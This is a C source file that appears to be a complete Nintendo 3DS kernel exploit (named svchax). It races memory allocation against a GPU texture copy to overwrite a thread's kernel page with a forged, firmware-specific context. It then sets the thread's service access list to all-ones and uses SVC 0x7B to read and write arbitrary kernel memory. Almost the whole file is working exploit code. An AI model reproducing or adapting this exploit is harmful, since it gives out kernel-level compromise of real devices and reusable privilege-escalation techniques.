#include <3ds.h>
#include <stdio.h>
#include <string.h>
#include <malloc.h>


u32 backdoor_args;
Result (*backdoor_entry)(void* args);

s32 backdoor_wrap(void)
{
   __asm__ volatile("cpsid aif \n\t");
   backdoor_args = backdoor_entry((void*)backdoor_args);
   return 0;
}

Result svc_7b(Result(*entry)(void* args), void* args)
{
   backdoor_args = (u32)args;
   backdoor_entry = entry;

   __asm__ volatile("cpsid aif \n\t");
   svcBackdoor(backdoor_wrap);
   __asm__ volatile("cpsie aif \n\t");
   return (Result)backdoor_args;
}


Result read_mem_7b(void* kaddr)
{
   u32* ptr = (u32*)kaddr;
   return *ptr;
}

u32 read_kaddr(u32 kaddr)
{
   return (u32)svc_7b(read_mem_7b, (void*)kaddr);
}

Result write_mem_7b(void* args)
{
   u32* vals = (u32*)args;
   *(u32*)vals[0] = vals[1];
   return 0;
}

void write_kaddr(u32 kaddr, u32 val)
{
   u32 vals[] = {kaddr, val};
   svc_7b(write_mem_7b, vals);
}


Handle arbiter;
volatile u32 alloc_address;
volatile u32 alloc_size;

volatile bool lock_thread;

volatile bool lock_alloc;
volatile bool alloc_finished;

void alloc_thread(void* arg)
{
   u32 tmp;
   alloc_finished = false;

   while (lock_alloc)
      svcSleepThread(100);

   svcControlMemory(&tmp, alloc_address, 0x0, alloc_size, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE);
   alloc_finished = true;
   svcExitThread();
}
u8 flush_buffer[0x10000];
void poll_thread(void* arg)
{
   while ((u32) svcArbitrateAddress(arbiter, alloc_address, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0) == 0xD9001814)
      svcSleepThread(10000);
   __asm__ volatile("cpsid aif \n\t");
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   while (lock_thread);
   __asm__ volatile("cpsie aif \n\t");
   svcExitThread();
}

typedef struct
{
   u32 version;
   u32 kthread_addr;
   u32 lock_addr;
   u32 buffer[0x80];
}fake_page_t;

fake_page_t fake_pages[] = {
   {
      0x022E0000, 0xFFF849E0, 0xFFF718D8,
      {
         0xFFF7B038, 0x00000000, 0xFFF84A90, 0xFFF063AC, 0xFFF84A90, 0xFF54A000, 0xFFF7B038, 0xFFF021F4,
         0xFF565E28, 0xFFF0EB80, 0xFFF84A90, 0xFF54A000, 0xFFF7B038, 0x00000000, 0xFFF84A90, 0x00000030,
         0x00000003, 0xFFF147C4, 0x00000118, 0x00000001, 0x00000000, 0xFFF84A90, 0x00108E04, 0x028A804D,
         0xFF54A000, 0xFFF7B038, 0x001A43EC, 0x00000030, 0x00000000, 0xFFF84A90, 0x00000001, 0xFFF84A90,
         0x00000001, 0xFFFD50C8, 0x60000013, 0xFFF849E0, 0xFFF30DF4, 0xFFF30DF4, 0xFFF718D8, 0x000799E3,
         0x09401BFE, 0xFFF19BBC, 0xFFFD50C8, 0xFFF1C97C, 0x00000000, 0x001C599C, 0xFFFFFFFF, 0xFFF06B38,
         0xFFF718D8, 0x001C599C, 0xFFF718D8, 0xFFFFFFFF, 0xFFF2D0C8, 0x00000000, 0xFFF2801F, 0x00000001,
         0x00000000, 0xFFF059A4, 0xFFFFFFFF, 0x001C599C, 0xFFF2C91E, 0x0000001F, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0xFFF058C4, 0x00000024, 0x00000000, 0xFFF022E0, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x001C5978, 0x00108EAC, 0x00108F5C, 0x00000010, 0xFFFA9F4E, 0x3FE7FFBF,
         0x00000000, 0x00000000, 0x24000000, 0x00000000, 0xFFFD50C8, 0x60000013, 0xFFF849E0, 0xFFF30DF4,
         0xFFF30DF4, 0xFFF718D8, 0x000799E3, 0x09401BFE, 0xFF565EB0, 0xFFF1C97C, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x03C00000
      }
   },
   {
      0x02320100, 0xFFF84918, 0xFFF718B0,
      {
         0xFFF849C8, 0xFF556000, 0xFFF7B390, 0x00000000, 0xFFF84900, 0x00000000, 0x00000007, 0xFFF0B42C,
         0x0000000A, 0xFFF0B42C, 0x0000000A, 0x00000001, 0xFFF7B464, 0x00000000, 0xFFF849C8, 0x0000008D,
         0xFF565EE8, 0xFFF063A0, 0xFFF7B464, 0xFFF7B474, 0x00000001, 0xFFF849C8, 0x00000001, 0xFFFD50C8,
         0x60000013, 0xFFF84918, 0xFFF30DF4, 0xFFF30DF4, 0xFFF718B0, 0x00059FAB, 0x09401BFE, 0xFFF19EF8,
         0xFFFD50C8, 0xFFF1CCB8, 0x00000000, 0x0014F99C, 0xFFFFFFFF, 0xFFF06B44, 0xFFF718B0, 0x0014F99C,
         0xFFF718B0, 0xFFFFFFFF, 0xFFF2D0C8, 0x00000000, 0xFFF2851F, 0x00000001, 0x00000000, 0xFFF05998,
         0xFFFFFFFF, 0x0014F99C, 0xFFF2C91E, 0x0000001F, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0xFFF058B8, 0x00000024, 0x00000001, 0xFFF022A4, 0x00180025, 0xFFFFFFFF, 0xFFFFFFFF, 0x0014F99C,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x0014F978, 0x00100EAC, 0x00100F5C, 0x00000010, 0xFFFA9F4E, 0x3FE7FFBF,
         0x00000000, 0x08000000, 0x24000100, 0x00000000, 0xFFFD50C8, 0x60000013, 0xFFF84918, 0xFFF30DF4,
         0xFFF30DF4, 0xFFF718B0, 0x00059FAB, 0x09401BFE, 0xFF565E88, 0xFFF1CCB8, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x03C00000
      }
   },
   {
      0x02320B00, 0xFFF84398, 0xFFF71C70,
      {
         0xFFF84A78, 0xFF556000, 0xFFF7B390, 0x00000000, 0xFFF84A78, 0x00000030, 0x00000000, 0xFFF14800,
         0x0000000A, 0xFFF0B3F8, 0x0000000A, 0x00000001, 0xFFF7B464, 0x00000000, 0xFFF84A78, 0x0000008D,
         0xFF565EE8, 0xFFF06360, 0xFFF7B464, 0xFFF7B474, 0x00000001, 0xFFF84A78, 0x00000001, 0xFFFD50C8,
         0x60000013, 0xFFF84398, 0xFFF30DF4, 0xFFF30DF4, 0xFFF71C70, 0x00059FAC, 0x09401BFE, 0xFFF19EC4,
         0xFFFD50C8, 0xFFF1CCB0, 0x00000000, 0x0014F99C, 0xFFFFFFFF, 0xFFF06B04, 0xFFF71C70, 0x0014F99C,
         0xFFF71C70, 0xFFFFFFFF, 0xFFF2D0C8, 0x00000000, 0xFFF2851F, 0x00000001, 0x00000000, 0xFFF059A0,
         0xFFFFFFFF, 0x0014F99C, 0xFFF2C91E, 0x0000001F, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0xFFF058C0, 0x00000024, 0x00000001, 0xFFF022AC, 0x00180025, 0xFFFFFFFF, 0xFFFFFFFF, 0x0014F99C,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x0014F978, 0x00100EAC, 0x00100F5C, 0x00000010, 0xFFFA9F4E, 0x3FE7FFBF,
         0x00000000, 0x08000000, 0x24000100, 0x00000000, 0xFFFD50C8, 0x60000013, 0xFFF84398, 0xFFF30DF4,
         0xFFF30DF4, 0xFFF71C70, 0x00059FAC, 0x09401BFE, 0xFF565E88, 0xFFF1CCB0, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000,
         0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x03C00000
      }
   }
};

typedef struct
{
   u32 svc_stack [0xF00 >> 2];
   u32 unkown_F00;
   u32 unkown_F04;
   u32 unkown_F08;
   u32 unkown_F0C;
   u32 unkown_F10;
   u32 unkown_F14;
   u32 unkown_F18;
   u32 unkown_F1C;
   u32 unkown_F20;
   u32 unkown_F24;
   u32 usr_sp; //0xF28
   u32 usr_lr; //0xF2C
   u32 usr_pc; //0xF30
   u32 unkown_F34;
   u32 svc_ctl[4]; //0xF38
   u8 unkown_F48;
   u8 unkown_F49;
   u8 unkown_F4A;
   u8 svc_id;     //0xF4B
   u32 unkown_F4C;
   u32 svc_r4; //0xF50
   u32 svc_r5; //0xF54
   u32 svc_r6; //0xF58
   u32 svc_r7; //0xF5C
   u32 svc_r8; //0xF60
   u32 svc_r9; //0xF64
   u32 svc_sl; //0xF68
   u32 svc_fp; //0xF6C
   u32 svc_sp; //0xF70
   u32 svc_lr; //0xF74
   u32 vfp_regs[0x20]; //0xF78
   u32 unknown_FF8;
   u32 unknown_FFC;
} thread_page_t;

typedef struct
{
   u32 r0;
   u32 r1;
   u32 r2;
   u32 r3;
   u32 r4;
   u32 r5;
   u32 r6;
   u32 r7;
   u32 r8;
   u32 r9;
   u32 r10;
   u32 r11;
   u32 r12;
   u32 sp;
   u32 lr;
   u32 pc;

} regstate_t;
typedef struct
{
   thread_page_t page;
   u32 stack[0x1000];
   regstate_t regs;
   Handle handle;
   u32 kthread_addr;
   Handle lock;
   u32 lock_addr;
   volatile bool ready;
   volatile bool has_7B_access;
   u32 thread_page_va;
   u32 thread_page_kva;
   u32 offset;
   u32 main_thread_page_addr;

} target_thread_vars_t;

target_thread_vars_t target;

static u32 get_thread_page(void)
{
   register u32 r0 __asm__("r0");
   __asm__ volatile(
      "sub r0, sp, #8 \n\t"
      "mov r1, #1 \n\t"
      "mov r2, #0 \n\t"
      "svc    0x2A \n\t"
      "mov r0, r1, LSR#12 \n\t"
      "mov r0, r0, LSL#12 \n\t"
      :::"r0", "r1", "r2");
   return r0;
}

s32 backup_page_kernel(void)
{
   __asm__ volatile("cpsid aif \n\t");
   memcpy(&target.page, (void*)target.thread_page_va, 0x1000);
   return 0;
}
s32 restore_page_kernel(void)
{
   __asm__ volatile("cpsid aif \n\t");
   memcpy((void*)target.thread_page_va, &target.page, 0x1000);
   return 0;
}

void create_target_page()
{
   u32 version = *(u32*)0x1FF80000;
   int i;
   fake_page_t* fake_page = fake_pages;
   for (i = 1; i < (sizeof(fake_pages)/sizeof(*fake_pages)); i++)
   {
      if(version >= fake_pages[i].version)
         fake_page = fake_pages + i;
   }
   memcpy((u8*)&target.page + sizeof(target.page) - sizeof(fake_page->buffer), fake_page->buffer, sizeof(fake_page->buffer));
   target.page.svc_sp = (target.page.svc_sp & 0xFFF) | (target.thread_page_va & ~0xFFF);
   target.page.usr_lr = target.regs.lr;
   target.page.usr_sp = target.regs.sp;
   target.page.usr_pc = target.regs.pc;
   target.page.svc_ctl[0] = 0xFFFFFFFF;
   target.page.svc_ctl[1] = 0xFFFFFFFF;
   target.page.svc_ctl[2] = 0xFFFFFFFF;
   target.page.svc_ctl[3] = 0xFFFFFFFF;
//   target.page.svc_ctl[3] = 0x0F000000;
   extern void* __service_ptr;

   if(__service_ptr)
      target.offset = 0xCB8;
   else
      target.offset = 0xC90;

   u32* tpage = (u32*)&target.page;
   for (i = 0; i < 0x400; i++)
   {
      if (tpage[i] == fake_page->kthread_addr)
         tpage[i] = target.kthread_addr;
      else if (tpage[i] == fake_page->lock_addr)
         tpage[i] = target.lock_addr;
   }
}
void dummy_thread_entry(Handle lock)
{
   svcWaitSynchronization(lock, U64_MAX);
   svcExitThread();
}

Result patch_thread_acl(void* args)
{
   u32* page = (u32*)args;
   page[0xF38 >> 2] = 0xFFFFFFFF;
   page[0xF3C >> 2] = 0xFFFFFFFF;
   page[0xF40 >> 2] = 0xFFFFFFFF;
   page[0xF44 >> 2] = 0xFFFFFFFF;
   return 0;
}

void target_thread_entry(void* args)
{
   u32 tmp;
   (void)args;
   Handle tmp_thread;
   static u32 tmp_thread_stack[0x1000];
   Handle tmp_thread_lock;
   svcCreateEvent(&tmp_thread_lock, 1);
   svcClearEvent(tmp_thread_lock);

   svcCreateThread(&tmp_thread, (ThreadFunc)dummy_thread_entry, tmp_thread_lock,
                                   (u32*)&tmp_thread_stack[0x400], 0x30, 0);
   svcSignalEvent(tmp_thread_lock);
   svcWaitSynchronization(tmp_thread, U64_MAX);
   svcCloseHandle(tmp_thread);
   svcCloseHandle(tmp_thread_lock);

   target.thread_page_va = get_thread_page();
   target.regs.r0 = target.lock;
   target.regs.r1 = 0xFFFFFFFF;
   target.regs.r2 = 0xFFFFFFFF;
   target.ready = true;
   __asm__ volatile(
      "mov r2, %0 \n\t"
      "str r3,  [r2 , #0x0C] \n\t"
      "str r4,  [r2 , #0x10] \n\t"
      "str r5,  [r2 , #0x14] \n\t"
      "str r6,  [r2 , #0x18] \n\t"
      "str r7,  [r2 , #0x1C] \n\t"
      "str r8,  [r2 , #0x20] \n\t"
      "str r9,  [r2 , #0x24] \n\t"
      "str r10, [r2 , #0x28] \n\t"
      "str r11, [r2 , #0x2C] \n\t"
      "str r12, [r2 , #0x30] \n\t"
      "str r13, [r2 , #0x34] \n\t"
      "str r14, [r2 , #0x38] \n\t"
      "add r0,  r15, #0x10   \n\t"
      "str r0,  [r2 , #0x3C] \n\t"
      "ldr r0,  [r2 , #0x00] \n\t"
      "ldr r1,  [r2 , #0x04] \n\t"
      "ldr r2,  [r2 , #0x08] \n\t"
      "svc 0x24 \n\t"
      ::"r"(&target.regs):"r0", "r1", "r2");

   if (target.has_7B_access)
      svc_7b(patch_thread_acl, (void*)target.main_thread_page_addr);

   svcExitThread();
}

u32 get_first_free_basemem_page()
{
   s64 v1, v2;
   svcGetSystemInfo(&v1, 2, 0);
   svcGetSystemInfo(&v2, 0, 3);

   return 0xE006C000 + *(u32*)0x1FF80040 + *(u32*)0x1FF80044 + *(u32*)0x1FF80048 + v1 - v2 - (*(u32*)0x1FF80000 == 0x022E0000? 0x1000: 0x0);
}


Result svchax_init(void)
{
   int i;
   u32 tmp;
   target.main_thread_page_addr = get_thread_page();

   const u32 dummy_threads_count = 8;
   Handle dummy_thread_handles[8];
   static u8 dummy_thread_stacks[8][0x1000];
   Handle dummy_thread_lock;
   svcCreateEvent(&dummy_thread_lock, 1);
   svcClearEvent(dummy_thread_lock);

   for (i = 0; i < dummy_threads_count; i++)
   {
      svcCreateThread(&dummy_thread_handles[i], (ThreadFunc)dummy_thread_entry, dummy_thread_lock,
                                      (u32*)(&dummy_thread_stacks[i][sizeof(*dummy_thread_stacks) / sizeof(**dummy_thread_stacks)]), 0x30, 0);
   }

   svcCreateEvent(&target.lock, 0);
   svcClearEvent(target.lock);
   register u32 reg_r2 __asm__("r2");
   target.lock_addr = reg_r2 - 0x4;
   target.ready = false;
   target.has_7B_access = false;
   target.thread_page_kva = get_first_free_basemem_page();

   svcCreateThread(&target.handle, (ThreadFunc)target_thread_entry, 0,
                                   &target.stack[sizeof(target.stack) / sizeof(*target.stack)], 0x3F, 0);
   svcDuplicateHandle(&tmp, target.handle);
   svcCloseHandle(tmp);
   target.kthread_addr = reg_r2 - 0x4;

   svcSignalEvent(dummy_thread_lock);
   for (i = 0; i < dummy_threads_count ; i++)
   {
      gfxFlushBuffers();
      svcWaitSynchronization(dummy_thread_handles[i], U64_MAX);
      svcCloseHandle(dummy_thread_handles[i]);
   }
   svcCloseHandle(dummy_thread_lock);

   while (!target.ready)
      svcSleepThread(20000);

   gfxFlushBuffers();
   create_target_page();

   u32 fragmented_address = 0;

   arbiter = __sync_get_arbiter();
   aptOpenSession();
   APT_SetAppCpuTimeLimit(5);
   aptCloseSession();

   u32 linear_buffer;
   svcControlMemory(&linear_buffer, 0, 0, 0x1000, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);

   u32 linear_size = 0xF000;
   u32 skip_pages = 2;
   alloc_size = ((((linear_size - (skip_pages << 12)) + 0x1000) >> 13) << 12);
   u32 mem_free = osGetMemRegionFree(MEMREGION_APPLICATION);

   u32 fragmented_size = mem_free - linear_size;
   extern u32 __ctru_heap;
   extern u32 __ctru_heap_size;
   fragmented_address = __ctru_heap + __ctru_heap_size;
   u32 linear_address;
   alloc_address = fragmented_address + fragmented_size;
   gfxFlushBuffers();

   svcControlMemory(&linear_address, 0x0, 0x0, linear_size, MEMOP_ALLOC_LINEAR,
                    MEMPERM_READ | MEMPERM_WRITE);

   gfxFlushBuffers();
   if (fragmented_size)
      svcControlMemory(&tmp, (u32)fragmented_address, 0x0, fragmented_size, MEMOP_ALLOC,
                       MEMPERM_READ | MEMPERM_WRITE);

   if (skip_pages)
      svcControlMemory(&tmp, (u32)linear_address, 0x0, (skip_pages << 12), MEMOP_FREE, MEMPERM_DONTCARE);

   for (i = skip_pages; i < (linear_size >> 12) ; i += 2)
      svcControlMemory(&tmp, (u32)linear_address + (i << 12), 0x0, 0x1000, MEMOP_FREE, MEMPERM_DONTCARE);

   u32 alloc_address_kaddr = osConvertVirtToPhys((void*)linear_address) + 0xC0000000;

   tmp = alloc_address_kaddr;

   gfxFlushBuffers();
   u32 args;
   Handle alloc_thread_handle = 0;
   Handle poll_thread_handle = 0;
   static u8 alloc_thread_stack [0x1000];
   static u8 poll_thread_stack [0x1000];

   gfxFlushBuffers();
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);

   ((u32*)linear_buffer)[0] = 1;
   ((u32*)linear_buffer)[1] = target.thread_page_kva + target.offset;
   ((u32*)linear_buffer)[2] = alloc_address_kaddr + (((alloc_size >> 12) - 3) << 13) + (skip_pages << 12);

   u32 dst_memchunk = linear_address + (((alloc_size >> 12) - 2) << 13) + (skip_pages << 12);
   gfxFlushBuffers();
   lock_thread = true;
   lock_alloc = true;
   alloc_finished = false;
   svcCreateThread(&alloc_thread_handle, alloc_thread, (u32)&args, (u32*)(alloc_thread_stack + 0x1000), 0x3F, 1);
   svcCreateThread(&poll_thread_handle, poll_thread, (u32)&args, (u32*)(poll_thread_stack + 0x1000), 0x18, 1);

   lock_alloc = false;
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   GSPGPU_InvalidateDataCache((void*)dst_memchunk, 16);
   GSPGPU_FlushDataCache((void*)linear_buffer, 16);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   extern Handle gspEvents[GSPGPU_EVENT_MAX];
   svcClearEvent(gspEvents[GSPGPU_EVENT_PPF]);

   while ((u32) svcArbitrateAddress(arbiter, alloc_address, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0) == 0xD9001814);

   GX_TextureCopy((void*)linear_buffer, 0, (void*)dst_memchunk, 0, 16, 8);
   svcWaitSynchronization(gspEvents[GSPGPU_EVENT_PPF], U64_MAX);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   gfxFlushBuffers();
   lock_thread = false;
   u32* src;
   u32* dst;

   while (!alloc_finished);
   src = (u32*)((u32)&target.page + 0x1000);
   dst = (u32*)((u32)alloc_address + alloc_size);
   while (dst > (u32*)((u32)alloc_address + alloc_size - 0x200))
   {
      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);

      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);

      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);

      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);
   }
   GSPGPU_FlushDataCache((void*)((u32)alloc_address + alloc_size - 0x1000), 0x1000);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   src = (u32*)((u32)&target.page + 0x1000);
   dst = (u32*)((u32)alloc_address + alloc_size);
   while (dst > (u32*)((u32)alloc_address + alloc_size - 0x200))
   {
      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);

      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);

      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);

      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);
   }
   GSPGPU_FlushDataCache((void*)((u32)alloc_address + alloc_size - 0x1000), 0x1000);

   lock_thread = false;
   svcWaitSynchronization(alloc_thread_handle, U64_MAX);
   svcWaitSynchronization(poll_thread_handle, U64_MAX);
   svcCloseHandle(poll_thread_handle);
   svcCloseHandle(alloc_thread_handle);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   target.has_7B_access = true;
cleanup:
   svcSignalEvent(target.lock);
   svcWaitSynchronization(target.handle, U64_MAX);
   svcControlMemory(&tmp, alloc_address, 0, alloc_size, MEMOP_FREE, MEMPERM_DONTCARE);
   write_kaddr(alloc_address_kaddr + linear_size - 0x3000 + 0x4, alloc_address_kaddr + linear_size - 0x1000);
   svcCloseHandle(target.handle);
   svcCloseHandle(target.lock);
   svcControlMemory(&tmp, (u32)fragmented_address, 0x0, fragmented_size, MEMOP_FREE, MEMPERM_DONTCARE);
   for (i = 1 + skip_pages; i < (linear_size >> 12) ; i += 2)
      svcControlMemory(&tmp, (u32)linear_address + (i << 12), 0x0, 0x1000, MEMOP_FREE, MEMPERM_DONTCARE);

   svcControlMemory(&tmp, linear_buffer, 0, 0x1000, MEMOP_FREE, MEMPERM_DONTCARE);
   return 0;
}
